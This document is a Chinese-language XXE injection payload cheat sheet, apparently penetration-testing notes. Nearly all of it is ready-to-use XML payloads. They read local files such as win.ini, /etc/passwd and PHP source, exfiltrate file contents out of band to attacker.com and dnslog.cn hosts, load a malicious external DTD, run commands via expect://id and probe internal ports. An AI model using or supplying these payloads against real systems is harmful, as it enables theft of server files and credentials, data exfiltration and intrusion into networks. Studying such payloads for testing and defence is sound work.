### 查看测试网站是否可以解析XML
```xml
<?xml version="1.0" encoding="utf-8"?>  
<!DOCTYPE foo[  
        <!ENTITY hello "world">  
        ]>  
<foo>  
    &hello;  
</foo>
```
### 任意文件读取
基本文件读取(file协议读取本地文件)
```XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE  [ 
<!ENTITY xxe SYSTEM "file:///c:/Windows/win.ini"> ]>
<foo>&xxe;</foo>

<?xml version="1.0"?> 
<!DOCTYPE foo [    
<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts" > ]> 
<foo>&xxe;</foo>

<?xml version="1.0"?> 
<!DOCTYPE foo [    
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=C:/phpstudy_pro/WWW/pikachu/pikachu/vul/xxe/xxe_1.php" > ]> 
<foo>&xxe;</foo>

```

### 带外数据泄露 (OOB)
当直接回显不可见时，可以通过外带方式获取数据：
```xml
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
<!ENTITY % int "<!ENTITY % send SYSTEM 'http://attacker.com/?data=%xxe;'>">
%int;
%send;
]>
```

```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///C:/Windows/win.ini">   <!-- 读取 Windows 的 win.ini -->
  <!ENTITY % int "<!ENTITY % send SYSTEM 'http://wjj.42zxwu.dnslog.cn?data=%xxe;'>">  <!-- 构造外带请求 -->
  %int;      <!-- 声明 %send 实体 -->
  %send;     <!-- 触发请求，发送数据到攻击者服务器 -->
]>
<foo>placeholder</foo>  <!-- 某些解析器需要有效 XML 内容 -->
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY % file SYSTEM "file:///C:/Windows/win.ini">
    <!ENTITY % dtd "<!ENTITY % exfil SYSTEM 'http://%file;.ew6fzz.dnslog.cn/'>">
    %dtd;
    %exfil;
]>
<foo>placeholder</foo>
```

### 任意命令执行
XXE 实现命令执行需要满足以下条件之一：
1. 服务器使用 PHP 的 `expect` 模块
2. 服务器配置了某些特定的 XML 处理器
3. 结合其他漏洞（如 SSRF）实现间接命令执行
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "expect://id" >
]>
<foo>&xxe;</foo>
```

在某些情况下，可以通过加载外部 DTD 文件来执行命令：
```xml
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.com/malicious.dtd">
  %dtd;
  %execute;
]>
<foo></foo>

其中 malicious.dtd 内容为：
<!ENTITY % payload SYSTEM "file:///etc/passwd">
<!ENTITY % execute "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?%payload;'>">
```

### 探测内网端口
配合bp修改端口查看响应情况
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % port SYSTEM "http://192.168.245.172:80">
  %port;
]>
<foo>test</foo>

<?xml version="1.0"?> 
<!DOCTYPE foo [    
<!ENTITY xxe SYSTEM "http://127.0.0.1:80" > ]> 
<foo>&xxe;</foo>

```